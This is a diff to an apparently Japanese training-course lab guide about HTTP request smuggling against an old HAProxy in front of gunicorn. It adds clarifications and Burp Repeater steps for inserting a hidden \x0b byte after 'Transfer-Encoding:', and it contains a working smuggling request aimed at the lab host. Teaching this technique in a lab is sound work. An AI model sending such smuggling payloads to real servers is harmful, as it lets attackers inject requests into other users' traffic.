@@ -32,14 +32,16 @@
 Web ブラウザ <--> （古い）HAProxy <--> gunicorn
 ```
 
-この HAProxy は、`Transfer-Encoding:[\x0b]chunked` のようなヘッダをボディのサイズの解釈には利用しません。したがって、以下のようなリクエストを受け取った HAProxy は、これをバックエンドの gunicorn に全て転送します。なお、`Transfer-Encoding:`の直後に `\x0b` が隠れていることに注意してください。
+以降、便宜上、`[\x0b]` と書いたときには `\x0b` の一バイトを指すものとします。
+
+この HAProxy は、`Transfer-Encoding:[\x0b]chunked` のようなヘッダをボディのサイズの解釈には利用しません。したがって、以下のようなリクエストを受け取った HAProxy は、これをバックエンドの gunicorn に全て転送します。
 
 ```
 POST / HTTP/1.1
 Host: default.smuggling.challenge.camp2020.hacq.me
 User-Agent: malicious-payload
 Content-Length: 11
-Transfer-Encoding:chunked
+Transfer-Encoding:[\x0b]chunked
 
 0
 injected
@@ -64,20 +66,21 @@ injected
 
 次に Burp Repeater から攻撃リクエストを送信する用意をしましょう。
 はじめに、Burp Repeater を開き、「Request」の項目に以下のテキストをコピー & ペーストしてください。
-`Transfer-Encoding:` の後には `\x0b` という文字が隠れています。
 
 ```
 POST / HTTP/1.1
 Host: CHANGE_ME.smuggling.challenge.camp2020.hacq.me
 User-Agent: malicious-payload
 Content-Length: 11
-Transfer-Encoding:chunked
+Transfer-Encoding:%0bchunked
 
 0
 injected
 ```
 
 その後、ペーストしたテキスト内の `CHANGE_ME` という値を、あなたに割り当てられた固有の ID（`user01` のような文字列; 講義中に伝えられます）に置き換えてください。
+そして、`%0b` 3 文字をハイライトした上で右クリックし、表示されるコンテキストメニューの中から、「Convert Selection > URL > URL-decode」を選択してください。
+すると （`\x0b` を URL エンコードした際の表記である）`%0b` という 3 文字が URL デコードされ、`\x0b` の 1 バイトへと変換されます。
 
 また、Burp Repeater の画面の右上のペン型のボタンから、以下のようなダイアログを開いてください。
 
